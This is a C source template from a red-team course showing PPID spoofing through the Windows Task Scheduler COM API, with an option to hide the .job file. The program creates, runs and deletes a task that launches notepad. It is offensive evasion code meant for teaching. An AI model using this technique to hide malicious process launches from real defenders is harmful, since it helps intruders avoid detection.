/*

 Red Team Operator course code template
 PPID Spoofing - scheduler
 
 author: reenz0h (twitter: @SEKTOR7net)
 credit: Microsoft

*/
#include <windows.h>
#include <initguid.h>
#include <ole2.h>
#include <mstask.h>
#include <msterr.h>
#include <objidl.h>
#include <wchar.h>
#include <stdio.h>

#pragma comment (lib, "ole32")

//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main(int argc, char **argv) {
	HRESULT hr = S_OK;
	ITaskScheduler *pITS;

	printf("Let's start a dance!\n"); getchar();
	
	// initialize COM library
	hr = CoInitialize(NULL);

	printf("COM initialized.\n"); getchar();

	if (SUCCEEDED(hr)) {
		// get Task Scheduler object
		hr = CoCreateInstance(CLSID_CTaskScheduler,
							   NULL,
							   CLSCTX_INPROC_SERVER,
							   IID_ITaskScheduler,
							   (void **) &pITS);
		if (FAILED(hr)) {
			CoUninitialize();
			return 1;
		}
	}
	else 
		return 1;

	printf("Task Scheduler object is up.\n"); getchar();

	LPCWSTR pwszTaskName;
	ITask *pITask;
	IPersistFile *pIPersistFile;
	pwszTaskName = L"ExecME";

	// create new task
	hr = pITS->NewWorkItem(pwszTaskName,        // Name of task
						 CLSID_CTask,           // Class identifier 
						 IID_ITask,             // Interface identifier
						 (IUnknown**) &pITask); // Address of task 
	if (FAILED(hr)) {
		CoUninitialize();
		printf("Failed calling NewWorkItem, error = 0x%x\n", hr);
		return 1;
	}

	// set task parameters: comment, name, working directory, params
	pITask->SetComment(L"C'mon! Notepad is legit!");
	pITask->SetApplicationName(L"C:\\Windows\\System32\\notepad.exe");
	pITask->SetWorkingDirectory(L"C:\\Windows\\System32");
	pITask->SetParameters(L"c:\\rto\\boom.txt");
	pITask->SetAccountInformation(L"rto", NULL);  

	// set Flags
	pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);
	//pITask->SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON | TASK_FLAG_HIDDEN);  // hidden flag set on .job file

	// get a pointer to IPersistFile
	hr = pITask->QueryInterface(IID_IPersistFile,
							  (void **) &pIPersistFile);

	if (FAILED(hr))	{
		CoUninitialize();
		printf("Failed calling QueryInterface, error = 0x%x\n", hr);
		return 1;
	}

	// save the new task to disk
	hr = pIPersistFile->Save(NULL, TRUE);
	pIPersistFile->Release();
	
	if (FAILED(hr)) {
		CoUninitialize();
		printf("Failed calling Save, error = 0x%x\n", hr);
		return 1;
	}

	printf("Created task.\n");

	// run the task
	hr = pITask->Run();
	pITask->Release();

	if (FAILED(hr)) {
		printf("Failed calling ITask::Run, error = 0x%x\n", hr);
		CoUninitialize();
		return 1;
	}  
	printf("Task ran.\n");

	printf("Check C:\\Windows\\Tasks folder\n"); getchar();

	// and remove the task
	pITS->Delete(pwszTaskName);
	pITS->Release();                               // Release object
	printf("Task removed\n");

	// clean up
	CoUninitialize();
	
	printf("Go HOME!\n"); getchar();
	return 0;
}
